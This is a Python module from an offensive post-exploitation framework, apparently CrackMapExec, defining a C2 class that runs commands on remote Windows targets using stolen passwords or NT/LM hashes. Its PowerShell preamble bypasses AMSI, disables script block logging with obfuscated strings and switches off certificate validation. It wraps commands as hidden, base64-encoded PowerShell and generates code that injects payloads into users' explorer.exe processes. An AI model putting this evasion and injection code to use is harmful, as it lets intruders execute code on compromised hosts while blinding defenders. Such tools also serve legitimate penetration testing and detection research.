import cme
import logging
import imp
import os
from traceback import format_exc
from cme.helpers.powershell import strip_ps_code, encode_ps_command


class C2(object):
    def __init__(self, proto, payload, exec_methods, force_ps32, ret_output):
        self.proto = proto
        self.connection = proto.conn
        self.target = proto.host
        self.domain = proto.domain
        self.username = proto.username
        self.password = proto.password
        self.nthash = proto.nthash
        self.lmhash = proto.lmhash
        self.payload = payload
        self.exec_methods = exec_methods
        self.force_ps32 = force_ps32
        self.ret_output = ret_output
        self.aesKey = None
        self.doKerberos = False

    def run(self):
        pass

    def available_exec_methods(self):
        exec_methods = {}

        exec_method_path = os.path.join(os.path.dirname(cme.__file__), 'c2', 'exec_methods')

        for execm in os.listdir(exec_method_path):
            if execm[-3:] == '.py' and execm[:-3] != '__init__':
                execm_name = execm[:-3]

                exec_methods[execm_name] = imp.load_source('exec_method', os.path.join(exec_method_path, execm))

        return exec_methods

    def execute_command(self, command):
        command = self.create_ps_command(self.build_ps_command(command, self.ret_output), self.force_ps32)
        for method in self.exec_methods:
            try:
                logging.debug('Executing command via {} exec method'.format(method))
                m = getattr(self.available_exec_methods()[method], method.upper())(self.target, self.username, self.password, self.domain, self.lmhash, self.nthash)
                m.execute_command(command)
                break
            except Exception:
                logging.debug('Error executing command via {} execution method, traceback:'.format(method))
                logging.debug(format_exc())

    def create_ps_payload(self, payload):

        preamble = """[Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
try{
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed', 'NonPublic,Static').SetValue($null, $true)
}catch{}
try{
    $GroupPolicyField = [ref].Assembly.GetType('System.Management.Automation.Utils')."GetFie`ld"('cachedGroupPolicySettings', 'N'+'onPublic,Static')
    If ($GroupPolicyField) {
        $GroupPolicyCache = $GroupPolicyField.GetValue($null)
        If ($GroupPolicyCache['ScriptB'+'lockLogging']) {
            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging'] = 0
            $GroupPolicyCache['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging'] = 0
        }
        $val = [System.Collections.Generic.Dictionary[string,System.Object]]::new()
        $val.Add('EnableScriptB'+'lockLogging', 0)
        $val.Add('EnableScriptB'+'lockInvocationLogging', 0)
        $GroupPolicyCache['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging'] = $val
    } else {
        [ScriptBlock]."GetFie`ld"('signatures','N'+'onPublic,Static').SetValue($null,(New-Object Collections.Generic.HashSet[string]))
    }
}catch{}
"""
        payload = preamble + strip_ps_code(payload)

        logging.debug('Generated PS payload:\n {}...\n\n...{} \n'.format(payload[:300], payload[-300:]))

        #with open('last_command.debug', 'w') as last:
        #    last.write(command)

        return payload

    def ps_compress_decompress(self):
        compress_function = """
function Invoke-Compress
{
    [CmdletBinding()] Param (
        [Parameter(Mandatory = $True)]
        [string]
        $Data
    )

    $ScriptBytes = ([Text.Encoding]::ASCII).GetBytes($Data)
    $CompressedStream = New-Object IO.MemoryStream
    $DeflateStream = New-Object IO.Compression.DeflateStream ($CompressedStream, [IO.Compression.CompressionMode]::Compress)
    $DeflateStream.Write($ScriptBytes, 0, $ScriptBytes.Length)
    $DeflateStream.Dispose()
    $CompressedScriptBytes = $CompressedStream.ToArray()
    $CompressedStream.Dispose()
    $EncodedCompressedScript = [Convert]::ToBase64String($CompressedScriptBytes)

    return $EncodedCompressedScript
}
"""

        decompress_function = """
function Invoke-Decompress
{
    [CmdletBinding()] Param (
        [Parameter(Mandatory = $True)]
        [string]
        $Data
    )

    $B64Data = [IO.MemoryStream][Convert]::FromBase64String($Data.Trim())
    $Deflated = New-Object IO.Compression.DeflateStream($B64Data, [IO.Compression.CompressionMode]::Decompress)
    $Stream = New-Object IO.StreamReader($Deflated, [Text.Encoding]::ASCII)

    return $Stream.ReadToEnd()
}
"""
        return compress_function, decompress_function

    def build_ps_command(self, command, output=True):
        compress_func, decompress_func = self.ps_compress_decompress()

        if output:
            ps = compress_func + '\n' + decompress_func + '\n' + command
        else:
            ps = decompress_func + '\n' + command

        logging.debug("Built PS command:\n {} \n".format(ps))

        return ps

    def create_ps_command(self, command, force_ps32=False):
        if force_ps32:
            command = "C:\\Windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -noni -nop -w 1 -enc {}".format(encode_ps_command(strip_ps_code(command)))
        else:
            command = "powershell.exe -noni -nop -w 1 -enc {}".format(encode_ps_command(strip_ps_code(command)))

        return command

    def gen_ps_inject(self, command, procname='explorer.exe', inject_once=False):
        """
        The following code gives us some control over where and how Invoke-PSInject does its thang
        It prioritizes injecting into a process of the active console session
        """

        ps_code = '''
$injected = $False
$inject_once = {inject_once}
$command = "{command}"
$owners = @{{}}
$console_login = gwmi win32_computersystem | select -exp Username
gwmi win32_process | where {{$_.Name.ToLower() -eq '{procname}'.ToLower()}} | % {{
    if ($_.getowner().domain -and $_.getowner().user){{
    $owners[$_.getowner().domain + "\\" + $_.getowner().user] = $_.handle
    }}
}}
try {{
    if ($owners.ContainsKey($console_login)){{
        Invoke-PSInject -ProcId $owners.Get_Item($console_login) -PoshCode $command
        $injected = $True
        $owners.Remove($console_login)
    }}
}}
catch {{}}
if (($injected -eq $False) -or ($inject_once -eq $False)){{
    foreach ($owner in $owners.Values) {{
        try {{
            Invoke-PSInject -ProcId $owner -PoshCode $command
        }}
        catch {{}}
    }}
}}
'''.format(inject_once='$True' if inject_once else '$False', command=encode_ps_command(command), procname=procname)

        return ps_code
